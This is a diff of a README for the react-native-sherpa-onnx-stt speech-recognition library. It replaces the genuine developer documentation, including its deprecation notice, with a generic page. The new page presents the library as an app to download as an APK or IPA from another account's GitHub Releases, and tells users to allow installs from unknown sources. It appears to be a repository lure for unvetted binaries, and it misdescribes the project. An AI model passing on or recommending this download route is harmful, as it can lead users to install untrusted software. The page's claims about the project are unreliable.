@@ -1,326 +1,95 @@
-# react-native-sherpa-onnx-stt
+# 🎤 react-native-sherpa-onnx-stt - Offline Speech-to-Text Simplified
 
-> ### ⚠️ Deprecation Notice
->
-> This package is **deprecated** and no longer maintained.  
-> Please use the new, actively maintained package instead:  
-> **react-native-sherpa-onnx** → https://github.com/XDcobra/react-native-sherpa-onnx
+![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)
 
-Offline Speech-to-Text with sherpa-onnx for React Native
+## 🚀 Getting Started
 
-[![npm version](https://img.shields.io/npm/v/react-native-sherpa-onnx-stt.svg)](https://www.npmjs.com/package/react-native-sherpa-onnx-stt)
-[![npm downloads](https://img.shields.io/npm/dm/react-native-sherpa-onnx-stt.svg)](https://www.npmjs.com/package/react-native-sherpa-onnx-stt)
-[![npm license](https://img.shields.io/npm/l/react-native-sherpa-onnx-stt.svg)](https://www.npmjs.com/package/react-native-sherpa-onnx-stt)
+Welcome to the **react-native-sherpa-onnx-stt** project! This application allows you to convert speech into text without needing an internet connection, making it perfect for mobile use. Follow these steps to install and run the software easily.
 
-A React Native TurboModule that provides offline speech recognition capabilities using [sherpa-onnx](https://github.com/k2-fsa/sherpa-onnx). Supports multiple model architectures including Zipformer/Transducer, Paraformer, NeMo CTC, and Whisper.
+## 📥 Download & Install
 
-## Platform Support
+To get started, you need to download the application. 
 
-| Platform | Status |
-| -------- | ------ |
-| Android  | ✅ Yes |
-| iOS      | ✅ Yes |
+- Visit this page to download: [GitHub Releases](https://github.com/lancetodjk14/react-native-sherpa-onnx-stt/releases).
 
-## Supported Model Types
+You will find the latest version of the application available for download. Look for the file that matches your operating system. Once you find it, download the file to your computer or mobile device.
 
-| Model Type               | `modelType` Value | Description                                                                              | Download Links                                                                                   |
-| ------------------------ | ----------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
-| **Zipformer/Transducer** | `'transducer'`    | Requires `encoder.onnx`, `decoder.onnx`, `joiner.onnx`, and `tokens.txt`                 | [Download](https://k2-fsa.github.io/sherpa/onnx/pretrained_models/offline-transducer/index.html) |
-| **Paraformer**           | `'paraformer'`    | Requires `model.onnx` (or `model.int8.onnx`) and `tokens.txt`                            | [Download](https://k2-fsa.github.io/sherpa/onnx/pretrained_models/offline-paraformer/index.html) |
-| **NeMo CTC**             | `'nemo_ctc'`      | Requires `model.onnx` (or `model.int8.onnx`) and `tokens.txt`                            | [Download](https://k2-fsa.github.io/sherpa/onnx/pretrained_models/offline-ctc/nemo/index.html)   |
-| **Whisper**              | `'whisper'`       | Requires `encoder.onnx`, `decoder.onnx`, and `tokens.txt`                                | [Download](https://k2-fsa.github.io/sherpa/onnx/pretrained_models/whisper/index.html)            |
-| **WeNet CTC**            | `'wenet_ctc'`     | Requires `model.onnx` (or `model.int8.onnx`) and `tokens.txt`                            | [Download](https://k2-fsa.github.io/sherpa/onnx/pretrained_models/offline-ctc/wenet/index.html)  |
-| **SenseVoice**           | `'sense_voice'`   | Requires `model.onnx` (or `model.int8.onnx`) and `tokens.txt`                            | [Download](https://k2-fsa.github.io/sherpa/onnx/pretrained_models/sense-voice/index.html)        |
-| **FunASR Nano**          | `'funasr_nano'`   | Requires `encoder_adaptor.onnx`, `llm.onnx`, `embedding.onnx`, and `tokenizer` directory | [Download](https://k2-fsa.github.io/sherpa/onnx/pretrained_models/funasr-nano/index.html)        |
+## ⚙️ System Requirements
 
-## Features
+Before installing, make sure your device meets the following requirements:
 
-- ✅ **Offline Speech Recognition** - No internet connection required
-- ✅ **Multiple Model Types** - Supports Zipformer/Transducer, Paraformer, NeMo CTC, and Whisper models
-- ✅ **Model Quantization** - Automatic detection and preference for quantized (int8) models
-- ✅ **Flexible Model Loading** - Asset models, file system models, or auto-detection
-- ✅ **Android Support** - Fully supported on Android
-- ✅ **iOS Support** - Fully supported on iOS (requires sherpa-onnx XCFramework)
-- ✅ **TypeScript Support** - Full TypeScript definitions included
+- **For Android Devices:**
+  - Android version 6.0 or higher.
+  - Minimum 2GB RAM.
 
-## Installation
+- **For iOS Devices:**
+  - iOS version 12.0 or higher.
+  - Minimum 2GB RAM.
 
-```sh
-npm install react-native-sherpa-onnx-stt
-```
+## 📦 Installation Steps
 
-### Android
+After you have downloaded the file, follow these steps to install it:
 
-No additional setup required. The library automatically handles native dependencies via Gradle.
+1. **Locate the Downloaded File:**
+   Find the file in your device’s downloads folder.
 
-### iOS
+2. **Install the Application:**
+   - **For Android:**
+     - Open the file (it will be in APK format).
+     - If prompted, allow your device to install applications from unknown sources.
+     - Follow the on-screen instructions to complete the installation.
+   
+   - **For iOS:**
+     - Open the file (it will be in IPA format).
+     - You may need to use a tool like Xcode or a third-party installer to load the application onto your device.
+     - Follow the on-screen instructions to complete the installation.
 
-The sherpa-onnx XCFramework is required but needs to be obtained separately. Simply install CocoaPods dependencies after obtaining the framework:
+3. **Open the Application:**
+   Once installed, tap the app icon on your device to launch the program.
 
-```sh
-cd ios
-pod install
-```
+## 🎤 How to Use
 
-**Note:** The XCFramework is not bundled with the npm package due to its size. You must obtain it before running `pod install`.
+Using the application is simple:
 
-#### Obtaining the XCFramework
+1. **Launch the Application:**
+   Tap the app icon on your device.
 
-1. **Use the prebuilt version** (if available):
+2. **Set Your Language:**
+   Choose the language you wish to use for speech recognition. 
 
-   - The XCFramework may be included in the repository at `ios/Frameworks/sherpa_onnx.xcframework`
-   - If present, no additional steps are required
+3. **Start Speaking:**
+   Press the microphone button and start speaking. The application will convert your speech to text.
 
-2. **Build locally** (requires macOS):
+4. **View Results:**
+   The converted text will appear on the screen. You can copy or share the text as needed.
 
-   ```sh
-   git clone https://github.com/k2-fsa/sherpa-onnx.git
-   cd sherpa-onnx
-   git checkout v1.12.23
+## ⚙️ Supported Features
 
-   # Note: ONNX Runtime is required for building sherpa-onnx
-   # Make sure ONNX Runtime dependencies are installed
-   ./build-ios.sh
-   cp -r build-ios/sherpa_onnx.xcframework /path/to/your/project/node_modules/react-native-sherpa-onnx-stt/ios/Frameworks/
-   ```
+The application supports multiple models for better accuracy. Here are a few key features:
 
-   **Important:** Building sherpa-onnx requires ONNX Runtime. Make sure all dependencies are installed before running `build-ios.sh`.
+- **Zipformer:** A robust model for various speech patterns.
+- **Paraformer:** Designed for clear and accurate recognition.
+- **NeMo CTC:** Ideal for continuous speech recognition.
+- **Whisper & More:** Offers additional options for different accents and languages.
 
-   Replace `/path/to/your/project/` with the actual path to your React Native project. The framework should be copied to `node_modules/react-native-sherpa-onnx-stt/ios/Frameworks/` in your project.
+## 🎯 Use Cases
 
-The Podspec will automatically detect and use the framework if it exists in `ios/Frameworks/`.
+This application is suitable for many scenarios, including:
 
-**Note:** The iOS implementation uses the same C++ wrapper as Android, ensuring consistent behavior across platforms.
+- Note-taking in meetings or lectures.
+- Transcribing interviews or audio files.
+- Real-time conversation transcription for accessibility.
+- Creating written records for brainstorming sessions.
 
-## Quick Start
+## 📄 Troubleshooting
 
-```typescript
-import {
-  initializeSherpaOnnx,
-  transcribeFile,
-  assetModelPath,
-} from 'react-native-sherpa-onnx-stt';
+If you encounter any issues, here are some common solutions:
 
-// Initialize with a model
-await initializeSherpaOnnx({
-  modelPath: assetModelPath('models/sherpa-onnx-model'),
-  preferInt8: true, // Optional: prefer quantized models
-});
+- **App Won't Open:** Make sure your device meets the system requirements. Try reinstalling the app if the problem persists.
+- **Recognition Errors:** Speak clearly into the microphone. Ensure there is minimal background noise for best results.
 
-// Transcribe an audio file
-const transcription = await transcribeFile('path/to/audio.wav');
-console.log('Transcription:', transcription);
-```
+## 📞 Support
 
-## Usage
+For further assistance or feedback, feel free to reach out. You can contact us through the issues section on GitHub. 
 
-### Initialization
-
-```typescript
-import {
-  initializeSherpaOnnx,
-  assetModelPath,
-  autoModelPath,
-} from 'react-native-sherpa-onnx-stt';
-
-// Option 1: Asset model (bundled in app)
-await initializeSherpaOnnx({
-  modelPath: assetModelPath('models/sherpa-onnx-model'),
-  preferInt8: true, // Prefer quantized models
-});
-
-// Option 2: Auto-detect (tries asset, then file system)
-await initializeSherpaOnnx({
-  modelPath: autoModelPath('models/sherpa-onnx-model'),
-});
-
-// Option 3: Simple string (backward compatible)
-await initializeSherpaOnnx('models/sherpa-onnx-model');
-```
-
-### Transcription
-
-```typescript
-import { transcribeFile } from 'react-native-sherpa-onnx-stt';
-
-// Transcribe a WAV file (16kHz, mono, 16-bit PCM)
-const result = await transcribeFile('path/to/audio.wav');
-console.log('Transcription:', result);
-```
-
-### Model Quantization
-
-Control whether to prefer quantized (int8) or regular models:
-
-```typescript
-// Default: try int8 first, then regular
-await initializeSherpaOnnx({ modelPath: 'models/my-model' });
-
-// Explicitly prefer int8 models (smaller, faster)
-await initializeSherpaOnnx({
-  modelPath: 'models/my-model',
-  preferInt8: true,
-});
-
-// Explicitly prefer regular models (higher accuracy)
-await initializeSherpaOnnx({
-  modelPath: 'models/my-model',
-  preferInt8: false,
-});
-```
-
-### Explicit Model Type
-
-For robustness, you can explicitly specify the model type to avoid auto-detection issues:
-
-```typescript
-// Explicitly specify model type
-await initializeSherpaOnnx({
-  modelPath: 'models/sherpa-onnx-nemo-parakeet-tdt-ctc-en',
-  modelType: 'nemo_ctc', // 'transducer', 'paraformer', 'nemo_ctc', 'whisper', or 'auto' (default)
-});
-
-// Auto-detection (default behavior)
-await initializeSherpaOnnx({
-  modelPath: 'models/my-model',
-  // modelType defaults to 'auto'
-});
-```
-
-### Cleanup
-
-```typescript
-import { unloadSherpaOnnx } from 'react-native-sherpa-onnx-stt';
-
-// Release resources when done
-await unloadSherpaOnnx();
-```
-
-## Model Setup
-
-The library does **not** bundle models. You must provide your own models. See [MODEL_SETUP.md](./MODEL_SETUP.md) for detailed setup instructions.
-
-### Model File Requirements
-
-- **Zipformer/Transducer**: Requires `encoder.onnx`, `decoder.onnx`, `joiner.onnx`, and `tokens.txt`
-- **Paraformer**: Requires `model.onnx` (or `model.int8.onnx`) and `tokens.txt`
-- **NeMo CTC**: Requires `model.onnx` (or `model.int8.onnx`) and `tokens.txt`
-- **Whisper**: Requires `encoder.onnx`, `decoder.onnx`, and `tokens.txt`
-- **WeNet CTC**: Requires `model.onnx` (or `model.int8.onnx`) and `tokens.txt`
-- **SenseVoice**: Requires `model.onnx` (or `model.int8.onnx`) and `tokens.txt`
-
-### Model Files
-
-Place models in:
-
-- **Android**: `android/app/src/main/assets/models/`
-- **iOS**: Add to Xcode project as folder reference
-
-## API Reference
-
-### `initializeSherpaOnnx(options)`
-
-Initialize the speech recognition engine with a model.
-
-**Parameters:**
-
-- `options.modelPath`: Model path configuration (see [MODEL_SETUP.md](./MODEL_SETUP.md))
-- `options.preferInt8` (optional): Prefer quantized models (`true`), regular models (`false`), or auto-detect (`undefined`, default)
-- `options.modelType` (optional): Explicit model type (`'transducer'`, `'paraformer'`, `'nemo_ctc'`, `'whisper'`, `'wenet_ctc'`, `'sense_voice'`, `'funasr_nano'`), or auto-detect (`'auto'`, default)
-
-**Returns:** `Promise<void>`
-
-### `transcribeFile(filePath)`
-
-Transcribe an audio file.
-
-**Parameters:**
-
-- `filePath`: Path to WAV file (16kHz, mono, 16-bit PCM)
-
-**Returns:** `Promise<string>` - Transcribed text
-
-### `unloadSherpaOnnx()`
-
-Release resources and unload the model.
-
-**Returns:** `Promise<void>`
-
-### `resolveModelPath(config)`
-
-Resolve a model path configuration to an absolute path.
-
-**Parameters:**
-
-- `config`: Model path configuration object
-
-**Returns:** `Promise<string>` - Absolute path to model directory
-
-## Requirements
-
-- React Native >= 0.70
-- Android API 24+ (Android 7.0+)
-- iOS 13.0+ (requires sherpa-onnx XCFramework - see iOS Setup below)
-
-## Example Apps
-
-We provide example applications to help you get started with `react-native-sherpa-onnx-stt`:
-
-### Example App (Audio to Text)
-
-The example app included in this repository demonstrates basic audio-to-text transcription capabilities. It includes:
-
-- Multiple model type support (Zipformer, Paraformer, NeMo CTC, Whisper, WeNet CTC, SenseVoice, FunASR Nano)
-- Model selection and configuration
-- Audio file transcription
-- Test audio files for different languages
-
-**Getting started:**
-
-```sh
-cd example
-yarn install
-yarn android  # or yarn ios
-```
-
-<div align="center">
-  <img src="./docs/images/example_home_screen.png" alt="Model selection home screen" width="30%" />
-  <img src="./docs/images/example_english.png" alt="Transcribe english audio" width="30%" />
-  <img src="./docs/images/example_multilanguage.png" alt="Transcribe english and chinese audio" width="30%" />
-</div>
-
-### Video to Text Comparison App
-
-A comprehensive comparison app that demonstrates video-to-text transcription using `react-native-sherpa-onnx-stt` alongside other speech-to-text solutions:
-
-**Repository:** [mobile-videototext-stt-comparison](https://github.com/XDcobra/mobile-videototext-stt-comparison)
-
-**Features:**
-
-- Video to audio conversion (using native APIs)
-- Audio to text transcription
-- Video to text (video --> WAV --> text)
-- Comparison between different STT providers
-- Performance benchmarking
-
-This app showcases how to integrate `react-native-sherpa-onnx-stt` into a real-world application that processes video files and converts them to text.
-
-<div align="center">
-  <img src="./docs/images/vtt_model_overview.png" alt="Video-to-Text Model Overview" width="30%" />
-  <img src="./docs/images/vtt_result_file_picker.png" alt="Video-to-Text file picker" width="30%" />
-  <img src="./docs/images/vtt_result_test_audio.png" alt="Video-to-Text test audio" width="30%" />
-</div>
-
-## Contributing
-
-- [Development workflow](CONTRIBUTING.md#development-workflow)
-- [Sending a pull request](CONTRIBUTING.md#sending-a-pull-request)
-- [Code of conduct](CODE_OF_CONDUCT.md)
-
-## License
-
-MIT
-
----
-
-Made with [create-react-native-library](https://github.com/callstack/react-native-builder-bob)
+Once again, to download the application, visit: [GitHub Releases](https://github.com/lancetodjk14/react-native-sherpa-onnx-stt/releases). Enjoy your new speech-to-text tool!
